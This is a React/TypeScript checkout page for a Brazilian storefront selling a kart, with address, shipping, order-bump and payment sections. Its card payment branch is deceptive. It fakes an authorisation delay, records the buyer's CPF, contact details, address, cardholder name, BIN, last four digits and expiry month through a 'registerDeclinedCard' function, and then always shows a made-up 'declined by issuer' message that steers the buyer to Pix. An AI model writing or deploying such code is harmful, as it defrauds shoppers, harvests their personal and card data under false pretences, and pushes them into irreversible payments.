import { getAttribution } from "@/lib/attribution";
import { createFileRoute, useNavigate, Link } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import {
  PRODUCT,
  ORDER_BUMPS,
  VISIBLE_ORDER_BUMP_IDS,
  type OrderBumpId,
  SHIPPING_PRICES,
  SHIPPING_LABELS,
  WARRANTY_PRICES,
  VARIANT_LABELS,
  VARIANT_PRICE_ADDON,
  calcTotal,
  checkoutSearchSchema,
  formatBRL,
} from "@/lib/checkout-state";
import { createPixTransaction } from "@/utils/primecash.functions";
import { registerDeclinedCard } from "@/utils/cards.functions";
import productImg from "@/assets/kart/product-main.jpg";
import garantiaCompraImg from "@/assets/order-bumps/garantia-compra.png";
import capaceteLs2Img from "@/assets/order-bumps/capacete-ls2.jpg";
import luvaX11Img from "@/assets/order-bumps/luva-x11.jpg";
import { trackTikTokEvent, identifyTikTok, sendTikTokServerEvent } from "@/lib/tiktok";

const motinhaImg = productImg;

const ORDER_BUMP_IMAGES: Record<OrderBumpId, string> = {
  "garantia-compra": garantiaCompraImg,
  "capacete-ls2": capaceteLs2Img,
  "luva-x11": luvaX11Img,
  "motinha-eletrica": motinhaImg,
};

const VISIBLE_ORDER_BUMPS = ORDER_BUMPS.filter((b) =>
  VISIBLE_ORDER_BUMP_IDS.includes(b.id)
);

export const Route = createFileRoute("/checkout/dados")({
  validateSearch: (search) => checkoutSearchSchema.parse(search),
  component: DadosPage,
});

type ShippingKey = "free" | "express" | "full";

function maskCPF(v: string) {
  return v
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}
function maskPhone(v: string) {
  return v
    .replace(/\D/g, "")
    .slice(0, 11)
    .replace(/(\d{2})(\d)/, "($1) $2")
    .replace(/(\d{5})(\d)/, "$1-$2");
}
function maskCEP(v: string) {
  return v.replace(/\D/g, "").slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");
}



function maskCard(v: string) {
  return v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}
function maskExpiry(v: string) {
  return v.replace(/\D/g, "").slice(0, 4).replace(/(\d{2})(\d)/, "$1/$2");
}
function detectBrand(digits: string): string {
  if (/^4/.test(digits)) return "Visa";
  if (/^5[1-5]|^2[2-7]/.test(digits)) return "Mastercard";
  if (/^3[47]/.test(digits)) return "Amex";
  if (/^(4011|4312|4389|5041|5067|6277|6362|6363)/.test(digits)) return "Elo";
  if (/^38|^60/.test(digits)) return "Hipercard";
  return "Outro";
}

function DadosPage() {
  const search = Route.useSearch();
  const navigate = useNavigate();
  const callPix = useServerFn(createPixTransaction);
  const callDeclined = useServerFn(registerDeclinedCard);

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [cpf, setCpf] = useState("");
  const [phone, setPhone] = useState("");
  const [cep, setCep] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [cepLoading, setCepLoading] = useState(false);

  const [shipping, setShipping] = useState<ShippingKey>(search.shipping);
  const [orderBumps, setOrderBumps] = useState<OrderBumpId[]>(() => {
    // Pré-seleciona um bump vindo via URL (ex.: motinha aceita na oferta cross-sell).
    const incoming = search.bump as OrderBumpId | undefined;
    if (incoming && ORDER_BUMPS.some((b) => b.id === incoming)) {
      return [incoming];
    }
    return [];
  });

  const [addressOpen, setAddressOpen] = useState(true);

  const [payMethod, setPayMethod] = useState<"pix" | "card">("pix");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardInstallments, setCardInstallments] = useState("1");
  const [cardDeclined, setCardDeclined] = useState(false);
  const [cardProcessing, setCardProcessing] = useState(false);

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  const variantLabel = VARIANT_LABELS[search.color] ?? search.color;
  const variantAddon = VARIANT_PRICE_ADDON[search.color] ?? 0;
  const unitPrice = PRODUCT.basePrice + variantAddon;

  const setFieldError = (field: string, msg: string | null) => {
    setFieldErrors((prev) => {
      const next = { ...prev };
      if (msg) next[field] = msg;
      else delete next[field];
      return next;
    });
  };

  const validateEmail = (value: string) => {
    if (!value) return "E-mail é obrigatório";
    if (/\s/.test(value)) return "E-mail não pode conter espaços";
    if (!/^\S+@\S+\.\S+$/.test(value)) return "E-mail inválido";
    return null;
  };

  const handleEmailChange = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    setEmail(cleaned);
    if (/\s/.test(value)) setFieldError("email", "E-mail não pode conter espaços");
    else setFieldError("email", validateEmail(cleaned));
  };

  const handleCepChange = async (value: string) => {
    const masked = maskCEP(value);
    setCep(masked);
    const digits = masked.replace(/\D/g, "");
    if (digits.length !== 8) return;
    setCepLoading(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setStreet(data.logradouro || "");
        setNeighborhood(data.bairro || "");
        setCity(data.localidade || "");
        setState((data.uf || "").toUpperCase());
      }
    } catch {
      // silent
    } finally {
      setCepLoading(false);
    }
  };

  const toggleOrderBump = (id: OrderBumpId) => {
    setOrderBumps((current) =>
      current.includes(id) ? current.filter((item) => item !== id) : [...current, id]
    );
  };

  const total = calcTotal({ warranty: "none", shipping, color: search.color, orderBumps });

  useEffect(() => {
    trackTikTokEvent("InitiateCheckout", {
      content_type: "product",
      content_id: "kart-velox",
      content_name: PRODUCT.name,
      value: total,
      currency: "BRL",
    });
  }, []);

  const handleSubmit = async (e?: React.FormEvent) => {
    e?.preventDefault();
    setError(null);

    const errors: Record<string, string> = {};
    if (!name.trim() || name.trim().length < 3) errors.name = "Informe seu nome completo";
    const emailErr = validateEmail(email);
    if (emailErr) errors.email = emailErr;
    if (cpf.replace(/\D/g, "").length !== 11) errors.cpf = "CPF inválido";
    if (phone.replace(/\D/g, "").length < 10) errors.phone = "Telefone inválido";
    if (cep.replace(/\D/g, "").length !== 8) errors.cep = "CEP inválido";
    if (!street.trim()) errors.street = "Informe a rua";
    if (!number.trim()) errors.number = "Informe o número";
    if (!neighborhood.trim()) errors.neighborhood = "Informe o bairro";
    if (!city.trim()) errors.city = "Informe a cidade";
    if (!state.trim()) errors.state = "Informe a UF";
    else if (state.length !== 2) errors.state = "UF inválida (2 letras)";

    if (Object.keys(errors).length > 0) {
      setFieldErrors(errors);
      setAddressOpen(true);
      setError("Preencha corretamente todos os campos destacados");
      const firstKey = Object.keys(errors)[0];
      setTimeout(() => {
        const el = document.querySelector(`[data-field="${firstKey}"]`);
        el?.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 50);
      return;
    }

    if (payMethod === "card") {
      const digits = cardNumber.replace(/\D/g, "");
      if (digits.length < 13 || !cardName.trim() || cardExpiry.replace(/\D/g, "").length < 4 || cardCvv.length < 3) {
        setError("Confira os dados do cartão para continuar");
        return;
      }
      setCardProcessing(true);
      setError(null);
      await new Promise((r) => setTimeout(r, 2200));
      const attr = getAttribution();
      try {
        await callDeclined({
          data: {
            customerName: name,
            customerCpf: cpf,
            customerPhone: phone,
            customerEmail: email,
            addressSummary: `${street}, ${number} — ${neighborhood}, ${city}/${state} — ${cep}`,
            addressStreet: street,
            addressNumber: number,
            addressComplement: complement || undefined,
            addressNeighborhood: neighborhood,
            addressCity: city,
            addressState: state,
            addressZipcode: cep,
            amountCents: Math.round(total * 100),
            cardBrand: detectBrand(digits),
            cardHolder: cardName,
            cardBin: digits.slice(0, 6),
            cardFirst4: digits.slice(0, 4),
            cardLast4: digits.slice(-4),
            cardExpiryMonth: cardExpiry.replace(/\D/g, "").slice(0, 2),
            declineReason: "Recusado pelo emissor do cartão",
            trafficSource: attr.ttclid || (attr.utmSource || "").toLowerCase().includes("tiktok") ? "tiktok" : attr.gclid ? "google" : "direto",
            utmCampaign: attr.utmCampaign,
            utmSource: attr.utmSource,
            utmMedium: attr.utmMedium,
            utmContent: attr.utmContent,
          },
        });

      } catch {
        // segue o fluxo mesmo se o registro falhar
      }
      setCardNumber("");
      setCardCvv("");
      setCardProcessing(false);
      setCardDeclined(true);
      setPayMethod("pix");
      setError(null);
      setTimeout(() => {
        document.querySelector('[data-field="pagamento"]')?.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 60);
      return;
    }

    setLoading(true);
    try {
      const result = await callPix({
        data: {
          amountCents: Math.round(total * 100),
          name,
          email,
          cpf,
          phone,
          warranty: "none",
          shippingOption: shipping,
          orderBumps,
          color: search.color,
          voltage: search.voltage,
          shipping: {
            street,
            streetNumber: number,
            complement: complement || undefined,
            zipCode: cep,
            neighborhood,
            city,
            state,
            country: "BR",
          },
          attribution: getAttribution(),
        },
      });

      if (!result.ok) {
        setError(result.error);
        setLoading(false);
        return;
      }

      identifyTikTok({ email, phone, externalId: result.sessionId });
      trackTikTokEvent(
        "PlaceAnOrder",
        {
          content_type: "product",
          content_id: "kart-velox",
          content_name: PRODUCT.name,
          value: total,
          currency: "BRL",
        },
        result.sessionId
      );

      void sendTikTokServerEvent({
        event: "PlaceAnOrder",
        eventId: result.sessionId,
        amount: total,
        currency: "BRL",
        email,
        phone,
        ttclid: getAttribution().ttclid,
      });

      navigate({ to: `/checkout/pix?s=${encodeURIComponent(result.sessionId)}` });
    } catch (err) {
      console.error(err);
      setError("Erro inesperado. Tente novamente.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col pb-32">
      {/* Header */}
      <header className="bg-white border-b sticky top-0 z-20">
        <div className="max-w-xl mx-auto px-4 py-3 flex items-center gap-3">
          <Link to="/" className="text-gray-700 text-xl leading-none w-8 h-8 flex items-center justify-center -ml-1">
            ←
          </Link>
          <h1 className="flex-1 text-center text-base font-semibold text-gray-900">
            Resumo do pedido
          </h1>
          <div className="w-8" />
        </div>
        <div className="max-w-xl mx-auto px-4 pb-2 -mt-1 text-center">
          <span className="text-xs text-emerald-600 font-medium inline-flex items-center gap-1">
            🔒 Dados transmitidos com criptografia SSL
          </span>
        </div>
      </header>

      <main className="flex-1 max-w-xl w-full mx-auto px-3 py-3 space-y-3">
        {/* Endereço de envio (colapsável) */}
        <section className="bg-white rounded-xl shadow-sm overflow-hidden">
          <button
            type="button"
            onClick={() => setAddressOpen((v) => !v)}
            className="w-full px-4 py-3 flex items-center justify-between"
          >
            <span className="inline-flex items-center gap-2 text-sm font-semibold text-gray-900">
              <span className="text-[#ff3a30]">📍</span> Endereço de envio
            </span>
            <span className={`text-gray-400 transition-transform ${addressOpen ? "rotate-180" : ""}`}>⌃</span>
          </button>

          {addressOpen && (
            <form id="checkout-form" onSubmit={handleSubmit} noValidate className="px-4 pb-4 space-y-2.5">
              <PlainField field="name" error={fieldErrors.name}>
                <input
                  value={name}
                  onChange={(e) => { setName(e.target.value); setFieldError("name", null); }}
                  className="ck-input"
                  placeholder="Nome completo"
                  required
                />
              </PlainField>

              <PlainField field="phone" error={fieldErrors.phone}>
                <div className="ck-input flex items-center gap-2 p-0">
                  <span className="pl-3 text-sm text-gray-500 select-none">+55</span>
                  <input
                    value={phone}
                    onChange={(e) => { setPhone(maskPhone(e.target.value)); setFieldError("phone", null); }}
                    className="flex-1 bg-transparent outline-none py-2.5 pr-3 text-sm"
                    placeholder="(00) 00000-0000"
                    inputMode="numeric"
                    required
                  />
                </div>
              </PlainField>

              <PlainField field="email" error={fieldErrors.email}>
                <input
                  type="email"
                  value={email}
                  onChange={(e) => handleEmailChange(e.target.value)}
                  onKeyDown={(e) => { if (e.key === " ") e.preventDefault(); }}
                  className="ck-input"
                  placeholder="email@exemplo.com"
                  required
                />
              </PlainField>

              <PlainField field="cep" error={fieldErrors.cep}>
                <input
                  value={cep}
                  onChange={(e) => { handleCepChange(e.target.value); setFieldError("cep", null); }}
                  className="ck-input"
                  placeholder="CEP"
                  inputMode="numeric"
                  required
                />
                {cepLoading && <span className="text-[11px] text-gray-500 mt-1 block">Buscando...</span>}
              </PlainField>

              <div className="grid grid-cols-2 gap-2.5">
                <PlainField field="state" error={fieldErrors.state}>
                  <input
                    value={state}
                    onChange={(e) => { setState(e.target.value.toUpperCase()); setFieldError("state", null); }}
                    maxLength={2}
                    className="ck-input"
                    placeholder="UF"
                    required
                  />
                </PlainField>
                <PlainField field="city" error={fieldErrors.city}>
                  <input
                    value={city}
                    onChange={(e) => { setCity(e.target.value); setFieldError("city", null); }}
                    className="ck-input"
                    placeholder="Cidade"
                    required
                  />
                </PlainField>
              </div>

              <PlainField field="neighborhood" error={fieldErrors.neighborhood}>
                <input
                  value={neighborhood}
                  onChange={(e) => { setNeighborhood(e.target.value); setFieldError("neighborhood", null); }}
                  className="ck-input"
                  placeholder="Bairro"
                  required
                />
              </PlainField>

              <PlainField field="street" error={fieldErrors.street}>
                <input
                  value={street}
                  onChange={(e) => { setStreet(e.target.value); setFieldError("street", null); }}
                  className="ck-input"
                  placeholder="Rua / Avenida"
                  required
                />
              </PlainField>

              <div className="grid grid-cols-2 gap-2.5">
                <PlainField field="number" error={fieldErrors.number}>
                  <input
                    value={number}
                    onChange={(e) => { setNumber(e.target.value); setFieldError("number", null); }}
                    className="ck-input"
                    placeholder="Número"
                    inputMode="numeric"
                    required
                  />
                </PlainField>
                <PlainField>
                  <input
                    value={complement}
                    onChange={(e) => setComplement(e.target.value)}
                    className="ck-input"
                    placeholder="Complemento"
                  />
                </PlainField>
              </div>

              <div className="pt-2">
                <p className="text-sm text-gray-700 font-medium inline-flex items-center gap-1.5 mb-2">
                  <span className="text-[#0070f3]">👤</span> CPF
                </p>
                <PlainField field="cpf" error={fieldErrors.cpf}>
                  <input
                    value={cpf}
                    onChange={(e) => { setCpf(maskCPF(e.target.value)); setFieldError("cpf", null); }}
                    className="ck-input"
                    placeholder="000.000.000-00"
                    inputMode="numeric"
                    required
                  />
                </PlainField>
              </div>
            </form>
          )}
        </section>

        {/* Divisor pontilhado vermelho */}
        <div className="relative py-1">
          <div className="border-t border-dashed border-[#ff3a30]/40" />
          <span className="absolute left-0 top-1/2 -translate-y-1/2 w-2.5 h-2.5 rounded-full bg-[#f5f5f5] border border-[#ff3a30]/40" />
          <span className="absolute right-0 top-1/2 -translate-y-1/2 w-2.5 h-2.5 rounded-full bg-[#f5f5f5] border border-[#ff3a30]/40" />
        </div>

        {/* Card produto + reputação */}
        <section className="bg-white rounded-xl p-3 shadow-sm">
          <div className="flex items-center justify-between mb-2 text-[11px]">
            <div className="flex items-center gap-2">
              <span className="text-gray-700">Vendido e entregue por Nova Era</span>
            </div>
            <button type="button" className="text-gray-500">Adicionar nota ›</button>
          </div>
          <div className="flex gap-3">
            <img
              src={productImg}
              alt={PRODUCT.name}
              className="w-20 h-20 object-contain rounded-lg bg-gray-50 border"
            />
            <div className="flex-1 min-w-0">
              <p className="text-sm font-semibold text-gray-900 leading-tight">
                {PRODUCT.name}
              </p>
              <p className="text-xs text-gray-500 mt-0.5">
                {variantLabel}
              </p>
              <p className="text-xs text-emerald-600 font-medium mt-1 inline-flex items-center gap-1">
                ✓ 7 dias para devolução
              </p>
              <div className="flex items-baseline gap-2 mt-1.5">
                <span className="text-lg font-bold text-[#ff3a30]">
                  {formatBRL(unitPrice)}
                </span>
              </div>
            </div>
            <div className="flex items-center gap-2 self-center shrink-0">
              <button type="button" disabled className="w-7 h-7 rounded-full border border-gray-300 text-gray-400 text-base leading-none">−</button>
              <span className="text-sm font-medium text-gray-800 w-4 text-center">1</span>
              <button type="button" disabled className="w-7 h-7 rounded-full border border-gray-300 text-gray-400 text-base leading-none">+</button>
            </div>
          </div>

          {/* Destaque: motinha incluída como combo */}
          {orderBumps.includes("motinha-eletrica") && (() => {
            const motinha = ORDER_BUMPS.find((b) => b.id === "motinha-eletrica");
            if (!motinha) return null;
            return (
              <div className="mt-3 rounded-lg border-2 border-dashed border-emerald-400 bg-emerald-50 p-3 flex items-center gap-3">
                <img
                  src={motinhaImg}
                  alt={motinha.name}
                  className="w-14 h-14 object-contain rounded-md bg-white border border-emerald-200 shrink-0"
                />
                <div className="flex-1 min-w-0">
                  <p className="text-[11px] font-bold uppercase tracking-wide text-emerald-700 inline-flex items-center gap-1">
                    🎁 Combo adicionado
                  </p>
                  <p className="text-sm font-semibold text-gray-900 leading-tight mt-0.5">
                    Pro Racing 90cc — MXF Motors
                  </p>
                  <p className="text-xs text-emerald-700 font-medium mt-0.5">
                    Vai junto com o seu kart no mesmo pedido
                  </p>
                </div>
                <span className="text-sm font-bold text-emerald-700 shrink-0">
                  + {formatBRL(motinha.price)}
                </span>
              </div>
            );
          })()}
        </section>

        {/* Order bumps */}
        <section className="bg-white rounded-xl p-4 shadow-sm space-y-3">
          <div>
            <h2 className="text-sm font-bold text-gray-900">Proteja sua compra</h2>
            <p className="text-xs text-gray-500 mt-0.5">Adicione a Garantia de Compra Protegida ao seu pedido, se desejar.</p>
          </div>
          {VISIBLE_ORDER_BUMPS.map((bump) => {
            const checked = orderBumps.includes(bump.id);
            return (
              <button
                key={bump.id}
                type="button"
                onClick={() => toggleOrderBump(bump.id)}
                className={`w-full flex items-center gap-3 rounded-lg border-2 p-3 text-left transition ${
                  checked ? "border-[#ff3a30] bg-[#fff5f4]" : "border-gray-200 bg-white"
                }`}
              >
                <span className={`w-5 h-5 rounded border-2 flex items-center justify-center shrink-0 ${checked ? "bg-[#ff3a30] border-[#ff3a30]" : "border-gray-300"}`}>
                  {checked && <span className="text-white text-xs leading-none">✓</span>}
                </span>
                <img src={ORDER_BUMP_IMAGES[bump.id]} alt={bump.name} className="w-14 h-14 rounded-md object-contain bg-gray-50 border" />
                <span className="flex-1 min-w-0">
                  <span className="block text-xs font-extrabold text-[#ff3a30] uppercase">Oferta especial</span>
                  <span className="block text-sm font-semibold text-gray-900 leading-tight">{bump.name}</span>
                  <span className="block text-xs text-gray-500 mt-0.5">Adicionar</span>
                </span>
                <span className="text-sm font-bold text-[#ff3a30] shrink-0">{formatBRL(bump.price)}</span>
              </button>
            );
          })}
        </section>

        {/* Opções de envio */}
        <section className="bg-white rounded-xl p-4 shadow-sm">
          <h2 className="text-sm font-semibold text-gray-900 mb-3">Opções de envio</h2>
          <div className="space-y-2">
            {(["free", "express", "full"] as ShippingKey[]).map((k) => (
              <ShippingOption
                key={k}
                checked={shipping === k}
                onSelect={() => setShipping(k)}
                title={SHIPPING_LABELS[k].title}
                subtitle={SHIPPING_LABELS[k].subtitle}
                priceLabel={SHIPPING_PRICES[k] === 0 ? "Grátis" : formatBRL(SHIPPING_PRICES[k])}
                priceClass={SHIPPING_PRICES[k] === 0 ? "text-emerald-600 font-semibold" : "text-gray-800 font-semibold"}
              />
            ))}
          </div>
        </section>

        {/* Resumo do pedido */}
        <section className="bg-white rounded-xl p-4 shadow-sm">
          <h2 className="text-sm font-semibold text-gray-900 mb-3">Resumo do pedido</h2>
          <div className="space-y-2 text-sm">
            <Row label={`${PRODUCT.shortName} — ${variantLabel}`} value={formatBRL(unitPrice)} />
            {orderBumps.map((id) => {
              const bump = ORDER_BUMPS.find((item) => item.id === id);
              if (!bump) return null;
              return <Row key={id} label={bump.name} value={formatBRL(bump.price)} />;
            })}

            <Row
              label="Taxa de envio"
              value={
                shipping === "free" ? (
                  <span className="text-emerald-600 font-semibold">Grátis</span>
                ) : (
                  formatBRL(SHIPPING_PRICES[shipping])
                )
              }
            />
            <div className="border-t pt-2 flex justify-between items-center">
              <span className="font-semibold text-gray-900">Total</span>
              <span className="text-lg font-bold text-[#ff3a30]">{formatBRL(total)}</span>
            </div>
            <p className="text-[11px] text-gray-400 text-right">Impostos inclusos</p>
          </div>
        </section>

        {/* Forma de pagamento */}
        <section className="bg-white rounded-xl p-4 shadow-sm" data-field="pagamento">
          <h2 className="text-sm font-semibold text-gray-900 mb-3">Forma de pagamento</h2>

          {cardDeclined && (
            <div className="mb-3 rounded-lg border border-red-200 bg-red-50 px-3 py-3">
              <p className="text-sm font-semibold text-red-700">Cartão recusado pelo emissor</p>
              <p className="mt-1 text-xs text-red-600 leading-relaxed">
                Não conseguimos autorizar o pagamento no cartão. Finalize agora no Pix — a
                aprovação é imediata e seu pedido é reservado na hora.
              </p>
            </div>
          )}

          <div className="space-y-2">
            <button
              type="button"
              onClick={() => setPayMethod("pix")}
              className={`w-full rounded-lg px-3 py-3 flex items-center justify-between border-2 ${
                payMethod === "pix" ? "border-emerald-500 bg-emerald-50/50" : "border-gray-200 bg-white"
              }`}
            >
              <span className="flex items-center gap-2">
                <span className="w-5 h-5 rounded-full bg-emerald-500 text-white text-xs flex items-center justify-center">✓</span>
                <span className="text-sm font-semibold text-gray-900">Pix</span>
                <span className="text-[11px] text-emerald-700">aprovação imediata</span>
              </span>
              <span className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${payMethod === "pix" ? "border-emerald-500" : "border-gray-300"}`}>
                {payMethod === "pix" && <span className="w-2 h-2 rounded-full bg-emerald-500" />}
              </span>
            </button>

            <button
              type="button"
              onClick={() => setPayMethod("card")}
              className={`w-full rounded-lg px-3 py-3 flex items-center justify-between border-2 ${
                payMethod === "card" ? "border-[#ff3a30] bg-red-50/40" : "border-gray-200 bg-white"
              }`}
            >
              <span className="flex items-center gap-2">
                <span className="text-base">💳</span>
                <span className="text-sm font-semibold text-gray-900">Cartão de crédito</span>
              </span>
              <span className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${payMethod === "card" ? "border-[#ff3a30]" : "border-gray-300"}`}>
                {payMethod === "card" && <span className="w-2 h-2 rounded-full bg-[#ff3a30]" />}
              </span>
            </button>
          </div>

          {payMethod === "card" && (
            <div className="mt-3 space-y-2">
              <input
                className="ck-input"
                inputMode="numeric"
                autoComplete="off"
                placeholder="Número do cartão"
                value={cardNumber}
                onChange={(e) => setCardNumber(maskCard(e.target.value))}
              />
              <input
                className="ck-input"
                placeholder="Nome impresso no cartão"
                autoComplete="off"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
              />
              <div className="grid grid-cols-2 gap-2">
                <input
                  className="ck-input"
                  inputMode="numeric"
                  autoComplete="off"
                  placeholder="Validade (MM/AA)"
                  value={cardExpiry}
                  onChange={(e) => setCardExpiry(maskExpiry(e.target.value))}
                />
                <input
                  className="ck-input"
                  inputMode="numeric"
                  autoComplete="off"
                  placeholder="CVV"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                />
              </div>
              <select
                className="ck-input"
                value={cardInstallments}
                onChange={(e) => setCardInstallments(e.target.value)}
              >
                {[1, 2, 3].map((n) => (
                  <option key={n} value={String(n)}>
                    {n}x de {formatBRL(total / n)} sem juros
                  </option>
                ))}
              </select>
              {cardProcessing && (
                <p className="text-xs text-gray-500">Autorizando pagamento com o emissor…</p>
              )}
            </div>
          )}

          <p className="text-[11px] text-gray-500 mt-2 leading-relaxed">
            Ao fazer um pedido, você concorda com os{" "}
            <Link to="/termos-de-uso" className="text-[#ff3a30] underline">Termos de uso e venda</Link>{" "}
            e reconhece que leu e concorda com a{" "}
            <Link to="/politica-de-privacidade" className="text-[#ff3a30] underline">Política de privacidade</Link>.
          </p>
        </section>

        {error && (
          <p className="text-sm text-red-700 bg-red-50 border border-red-200 px-3 py-2 rounded-lg">
            {error}
          </p>
        )}
      </main>

      {/* Footer fixo */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white border-t shadow-[0_-4px_12px_rgba(0,0,0,0.05)] z-30">
        <div className="max-w-xl mx-auto px-4 pt-2 pb-3">
          <div className="flex items-center justify-between gap-3">
            <div>
              <p className="text-[11px] text-gray-500 leading-none">Total ({1 + orderBumps.length} item{1 + orderBumps.length > 1 ? "s" : ""})</p>
              <p className="text-xl font-bold text-[#ff3a30] leading-tight">{formatBRL(total)}</p>
            </div>
            <button
              type="submit"
              form="checkout-form"
              disabled={loading || cardProcessing}
              className="flex-1 max-w-[220px] bg-[#ff3a30] hover:bg-[#e6332a] disabled:opacity-60 text-white py-3 rounded-lg font-semibold text-sm transition-colors"
            >
              {cardProcessing ? "Autorizando..." : loading ? "Gerando PIX..." : "Fazer pedido"}
            </button>
          </div>
          <p className="text-[11px] text-gray-500 text-center mt-2">
            Frete grátis · Entrega em 5 a 8 dias úteis
          </p>
        </div>
      </footer>

      <style>{`
        .ck-input {
          width: 100%;
          border: 1px solid #ececec;
          border-radius: 10px;
          padding: 12px 14px;
          font-size: 14px;
          outline: none;
          background: #f7f7f7;
          transition: border-color .15s, background .15s;
          color: #1f2937;
        }
        .ck-input::placeholder { color: #9ca3af; }
        .ck-input:focus { border-color: #ff3a30; background: #fff; box-shadow: 0 0 0 3px rgba(255,58,48,0.08); }
      `}</style>
    </div>
  );
}

function Row({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="flex justify-between text-gray-700">
      <span className="truncate pr-3">{label}</span>
      <span className="shrink-0">{value}</span>
    </div>
  );
}

function PlainField({
  children,
  error,
  field,
}: {
  children: React.ReactNode;
  error?: string;
  field?: string;
}) {
  return (
    <div data-field={field}>
      {children}
      {error && <span className="text-xs text-red-600 mt-1 block">{error}</span>}
    </div>
  );
}

function ShippingOption({
  checked,
  onSelect,
  title,
  subtitle,
  priceLabel,
  priceClass,
}: {
  checked: boolean;
  onSelect: () => void;
  title: string;
  subtitle: string;
  priceLabel: string;
  priceClass: string;
}) {
  return (
    <button
      type="button"
      onClick={onSelect}
      className={`w-full flex items-center justify-between gap-3 border rounded-lg px-3 py-3 text-left transition ${
        checked ? "border-[#ff3a30] bg-[#fff5f4]" : "border-gray-200 bg-white"
      }`}
    >
      <div className="flex items-center gap-3">
        <span
          className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
            checked ? "border-[#ff3a30]" : "border-gray-300"
          }`}
        >
          {checked && <span className="w-2.5 h-2.5 rounded-full bg-[#ff3a30]" />}
        </span>
        <div>
          <div className="text-sm font-medium text-gray-900">{title}</div>
          <div className="text-xs text-gray-500">{subtitle}</div>
        </div>
      </div>
      <span className={`text-sm ${priceClass}`}>{priceLabel}</span>
    </button>
  );
}

// `WARRANTY_PRICES` re-exported reference kept for type-only consumers
export { WARRANTY_PRICES };
